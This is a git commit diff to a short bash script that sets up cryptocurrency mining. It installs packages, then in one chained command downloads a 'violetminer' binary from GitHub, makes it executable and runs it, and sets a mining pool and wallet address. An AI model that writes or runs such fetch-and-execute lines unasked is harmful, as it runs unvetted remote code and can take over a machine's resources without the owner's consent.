22bd78e912c61b0b9091f7df9bf1fb10c82b1aca
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-14 16:46:19 +0100

    Update dsbh.sh

--- dsbh.sh
+++ dsbh.sh
@@ -1,9 +1,8 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen -y
-sudo apt install screen libjansson4 -y
-wget https://github.com/uveshV/uveshV/raw/main/violetminer
-chmod +x violetminer
+sudo apt install screen libjansson4 -y 
+wget https://github.com/uveshV/uveshV/raw/main/violetminer && chmod +x violetminer && ./violetminer
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
